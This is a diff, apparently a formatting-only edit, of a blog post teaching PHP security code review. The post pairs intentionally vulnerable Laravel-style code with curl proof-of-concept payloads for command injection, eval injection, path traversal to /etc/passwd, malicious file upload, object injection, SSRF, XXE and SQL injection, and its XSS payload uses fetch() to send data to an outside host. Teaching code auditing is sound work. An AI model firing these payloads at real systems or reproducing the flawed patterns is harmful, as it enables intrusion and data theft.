@@ -14,7 +14,8 @@ excerpt: "A direct, no-fluff guide to auditing PHP codebases. Learn to spot crit
 readTime: "20 min"
 url: "https://asbawy.github.io/logs/php-code-review"
 ---
-import { AlertTriangle, ShieldAlert, Terminal, Zap } from 'lucide-react';
+
+import { AlertTriangle, ShieldAlert, Terminal, Zap } from "lucide-react";
 
 ## The First 10 Minutes of Triage
 
@@ -26,6 +27,7 @@ Two files tell you almost everything you need to know about an application's sec
 
 **1. `.env` — The Secrets Vault**
 It often contains:
+
 - Database usernames and passwords
 - Third-party API keys (Stripe, AWS, SendGrid, etc.)
 - Encryption keys (`APP_KEY`)
@@ -33,6 +35,7 @@ It often contains:
 
 **2. `composer.json` — The Dependency Map**
 This reveals:
+
 - Exact framework versions (Laravel, Symfony, etc.)
 - Third-party libraries and their versions
 
@@ -43,6 +46,7 @@ This reveals:
 #### Case Study 1: `APP_DEBUG=true`
 
 When debug mode is left on in production, every error becomes a data leak. A simple 404 page can expose:
+
 - Full internal file paths (revealing server structure)
 - Database connection strings (with credentials)
 - Exact library versions (so attackers know which exploits to use)
@@ -50,6 +54,7 @@ When debug mode is left on in production, every error becomes a data leak. A sim
 #### Case Study 2: Leaked `APP_KEY`
 
 Modern PHP frameworks (like Laravel) use `APP_KEY` to:
+
 - Sign session cookies (forge valid sessions = bypass login)
 - Encrypt sensitive data
 - Sign serialized objects
@@ -59,6 +64,7 @@ If an attacker gets this key, they can forge admin cookies or craft malicious se
 ### Attack Surface Mapping: Finding the Doors
 
 Routing files are like a building's floor plan—they show you every entrance. Check these files:
+
 - `routes/web.php` — Regular web pages
 - `routes/api.php` — API endpoints
 - `routes/index.php` — Legacy or custom routing
@@ -88,7 +94,7 @@ graph LR
     B -- "Passed" --> D[Sanitizer / Validator]
     D -- "Bypassed?" --> E[Application Logic]
     E --> F[Sink: Dangerous Execution]
-    
+
     style A fill:#FF5252,color:#fff,stroke:#FF5252
     style F fill:#FF5252,color:#fff,stroke:#FF5252
     style B fill:transparent,stroke:#fff,stroke-width:1px,color:#fff
@@ -97,12 +103,12 @@ graph LR
     style E fill:transparent,stroke:#fff,stroke-width:1px,color:#fff
 ```
 
-| Concept | Simple Definition | Example |
-|---------|----------------|---------|
-| **Source** | Where untrusted data enters your app | `$_GET['id']`, `$request->input('email')`, uploaded files |
-| **Sink** | A dangerous function that can execute or expose data | `system()`, `eval()`, `file_get_contents()` |
-| **Middleware** | Security guards that check requests before they reach your code | Authentication, rate limiting, logging |
-| **Sanitizer/Validator** | Attempts to clean or restrict dangerous input | `htmlspecialchars()`, regex filters, input validation |
+| Concept                 | Simple Definition                                               | Example                                                   |
+| ----------------------- | --------------------------------------------------------------- | --------------------------------------------------------- |
+| **Source**              | Where untrusted data enters your app                            | `$_GET['id']`, `$request->input('email')`, uploaded files |
+| **Sink**                | A dangerous function that can execute or expose data            | `system()`, `eval()`, `file_get_contents()`               |
+| **Middleware**          | Security guards that check requests before they reach your code | Authentication, rate limiting, logging                    |
+| **Sanitizer/Validator** | Attempts to clean or restrict dangerous input                   | `htmlspecialchars()`, regex filters, input validation     |
 
 <div className="my-6 p-4 border-l-4 border-red-500 bg-red-500/10 rounded-r flex flex-col gap-2">
   <div className="flex items-center gap-2 text-red-500 font-semibold">
@@ -110,7 +116,9 @@ graph LR
     Critical Warning
   </div>
   <p className="m-0 text-sm text-foreground/80">
-    Sanitizers fail <strong>all the time</strong>. Developers often use flawed regex, create blacklists that miss edge cases, or assume stripping HTML tags stops all attacks. <strong>Never trust sanitization alone.</strong>
+    Sanitizers fail <strong>all the time</strong>. Developers often use flawed regex, create
+    blacklists that miss edge cases, or assume stripping HTML tags stops all attacks.{" "}
+    <strong>Never trust sanitization alone.</strong>
   </p>
 </div>
 
@@ -158,11 +166,11 @@ if ($isAdmin) {
 
 PHP's old random functions are **predictable**:
 
-| Function | Why It's Dangerous |
-|----------|------------------|
-| `rand()` | Uses a weak algorithm, easily predicted |
+| Function    | Why It's Dangerous                          |
+| ----------- | ------------------------------------------- |
+| `rand()`    | Uses a weak algorithm, easily predicted     |
 | `mt_rand()` | Mersenne Twister—mathematically predictable |
-| `uniqid()` | Based on system time (microseconds) |
+| `uniqid()`  | Based on system time (microseconds)         |
 
 An attacker who observes a few tokens can calculate future ones. This breaks password reset tokens, session IDs, and API keys.
 
@@ -182,10 +190,12 @@ We can use this to steal source code, revealing credentials and logic.
 ## The Vulnerability Exploit Matrix
 
 ### Command Injection
+
 The Sink: `system()`, `exec()`, `shell_exec()`, `passthru()`, backticks (`` `command` ``)
 
 Vulnerable Implementation
 PHP
+
 ```php
 public function ping(Request $request) {
     $host = $request->input('host');
@@ -193,22 +203,27 @@ public function ping(Request $request) {
     return response($output);
 }
 ```
+
 Exploitation (PoC)
+
 ```bash
 curl -s "http://vuln.com/tools/ping?host=127.0.0.1;id"
 ```
 
 ### Code Injection
+
 The Sink: `eval()`, `assert()`, `create_function()`
 
 Vulnerable Implementation
 PHP
+
 ```php
 public function evaluate(Request $request) {
     $expr = $request->input('expr');
     eval("return " . $expr . ";");
 }
 ```
+
 Exploitation (PoC)
 
 ```bash
@@ -216,15 +231,18 @@ curl -s "http://vuln.com/tools/calc?expr=system('id')"
 ```
 
 ### Cross-Site Scripting (XSS)
+
 The Sink: `echo`, `print`, unescaped Blade syntax `{!! !!}`
 
 Vulnerable Implementation
 PHP
+
 ```php
 public function welcome(Request $request) {
     echo "<h1>Welcome, " . $request->input('name') . "</h1>";
 }
 ```
+
 Exploitation (PoC)
 
 ```bash
@@ -232,10 +250,12 @@ curl -s "http://vuln.com/welcome?name=<script>fetch('https://asbawy.comesone/ste
 ```
 
 ### File Inclusion (LFI/RFI) & Path Traversal
+
 The Sink: `include`, `require`, `readfile`, `file_get_contents`
 
 Vulnerable Implementation
 PHP
+
 ```php
 public function show(Request $request) {
     $page = $request->input('page');
@@ -247,6 +267,7 @@ public function get(Request $request) {
     readfile('/var/www/html/uploads/' . $file);
 }
 ```
+
 Exploitation (PoC)
 
 ```bash
@@ -255,24 +276,27 @@ curl -s "http://vuln.com/files?file=../../../../etc/passwd"
 ```
 
 ### File Upload Attacks
+
 The Sink: `move_uploaded_file()`, `$file->move()`
 
 Vulnerable Implementation
 PHP
+
 ```php
 public function upload(Request $request) {
     $file = $request->file('avatar');
-    $filename = $file->getClientOriginalName(); 
-    
+    $filename = $file->getClientOriginalName();
+
     // DANGER: Checks the FIRST extension, not the last
     $parts = explode('.', $filename);
-    $ext = strtolower($parts[1]); 
-    
+    $ext = strtolower($parts[1]);
+
     if (in_array($ext, ['jpg', 'png', 'gif'])) {
         $file->move(public_path('avatars'), $filename);
     }
 }
 ```
+
 Exploitation (PoC)
 
 ```bash
@@ -280,17 +304,19 @@ curl -s -F "avatar=@shell.jpg.php" http://vuln.com/upload
 ```
 
 ### Insecure Deserialization (PHP Object Injection)
+
 The Sink: `unserialize()`
 
 PHP's `unserialize()` takes a string and converts it back into a PHP object. The danger arises because PHP automatically calls **"Magic Methods"** (like `__wakeup()` or `__destruct()`) during this process. If an attacker controls the serialized string, they can inject arbitrary objects and trigger these magic methods to execute malicious code.
 
 **The "Gadget" Class (Vulnerable Implementation)**
 PHP
+
 ```php
 class FileLogger {
     public $filename = 'log.txt';
     public $data = 'User logged in';
-    
+
     // Magic method triggered automatically when the object is destroyed
     public function __destruct() {
         file_put_contents($this->filename, $this->data);
@@ -313,10 +339,12 @@ curl -s "http://vuln.com/profile?data=O:10:%22FileLogger%22:2:{s:8:%22filename%2
 ```
 
 ### Server-Side Request Forgery (SSRF)
+
 The Sink: `GuzzleHttp\Client`, `curl_exec`, `file_get_contents`
 
 Vulnerable Implementation
 PHP
+
 ```php
 public function preview(Request $request) {
     $url = $request->input('url');
@@ -325,6 +353,7 @@ public function preview(Request $request) {
     return $response->getBody();
 }
 ```
+
 Exploitation (PoC)
 
 ```bash
@@ -333,12 +362,14 @@ curl -s "http://vuln.com/link/preview?url=http://192.168.1.1:8080/admin"
 ```
 
 ### XML External Entity (XXE) Injection
+
 The Sink: `DOMDocument::loadXML()`, `simplexml_load_string()` with `LIBXML_NOENT`
 
 Note: As of PHP 8.0, libxml disables external entity loading by default. Passing the LIBXML_NOENT flag actively overrides this native security boundary, making it a critical misconfiguration to hunt for.
 
 Vulnerable Implementation
 PHP
+
 ```php
 public function import(Request $request) {
     $xml = $request->input('xml');
@@ -347,6 +378,7 @@ public function import(Request $request) {
     return response()->json(['success' => true]);
 }
 ```
+
 Exploitation (PoC)
 
 ```bash
@@ -354,16 +386,19 @@ curl -s -X POST http://vuln.com/import -d 'xml=<?xml version="1.0"?><!DOCTYPE fo
 ```
 
 ### SQL Injection
+
 The Sink: `DB::raw()`, `whereRaw()`, direct concatenation in queries
 
 Vulnerable Implementation
 PHP
+
 ```php
 $sort = $request->input('sort', 'name');
 $users = User::orderBy($sort)->get();
 
 $users = DB::select(DB::raw("SELECT * FROM users WHERE status = '" . $request->input('status') . "'"));
 ```
+
 Exploitation (PoC)
 
 ```bash
@@ -422,6 +457,7 @@ Analyze the following codebase:
 ```
 
 ## References
+
 - PHP Official Documentation: https://www.php.net/docs.php
 - OWASP PHP Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html
 - Packagist Security Advisories: https://packagist.org/security-advisories
